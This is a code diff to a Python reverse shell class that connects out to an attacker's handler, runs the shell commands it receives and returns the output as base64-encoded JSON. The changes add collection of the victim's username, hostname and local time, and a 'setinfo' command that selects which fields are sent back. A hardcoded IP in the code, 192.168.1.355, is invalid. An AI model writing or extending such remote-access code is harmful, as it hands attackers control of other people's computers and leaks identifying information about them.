@@ -1,4 +1,4 @@
-import socket, subprocess, os, threading, json, base64
+import socket, subprocess, os, threading, json, base64, win32api, datetime
 
 class Shell:
 	def __init__(self, handler_ip, handler_port):
@@ -6,6 +6,9 @@ class Shell:
 		self.handler_port = handler_port
 		
 		self.comm_socket = socket.socket()
+		
+		self.possible_info = ["cwd","ip","data","username","localtime","hostname"]
+		self.sent_info = ["cwd","ip","data","username","localtime","hostname"]
 
 	def connect(self):
 		self.comm_socket.connect((self.handler_ip, self.handler_port))
@@ -14,12 +17,34 @@ class Shell:
 		data = self.comm_socket.recv(4096)
 		if not data: raise Exception("Handler disconnected")
 		return data
-
+		
+	def set_package_items(self, items):
+		if items == "minimal":
+			self.sent_info = ["data"]
+		elif items == "small":
+			self.sent_info = ["data","cwd"]
+		elif items == "username":
+			self.sent_info = ["data","cwd","username"]
+		else:
+			self.sent_info = items.split()
+			for item in list(self.sent_info):
+				if item not in self.possible_info:
+					self.sent_info.remove(item)
+			if "data" not in self.sent_info: self.sent_info.append("data")
+		return "Now sending "+repr(self.sent_info)
+		
 	def package(self, data):
 		package = {}
 		package["cwd"] = base64.b64encode(os.getcwd())
 		package["ip"] = base64.b64encode("192.168.1.355")
 		package["data"] = base64.b64encode(data)
+		package["username"] = base64.b64encode(win32api.GetUserName())
+		package["localtime"] = base64.b64encode(datetime.datetime.now().strftime("%H:%M:%S"))
+		package["hostname"] = base64.b64encode(socket.gethostname())
+
+		for key in package.keys():
+			if key not in self.sent_info: package[key] = ""
+			
 		return json.dumps(package)
 
 
@@ -48,8 +73,11 @@ class Shell:
 			
 		if command == "test":
 			output = "test successful"
+		elif command == "setinfo":
+			output = self.set_package_items(arguments)
 		elif command == "cd":
 			self.change_directory(arguments)
+			output = ""
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
 			
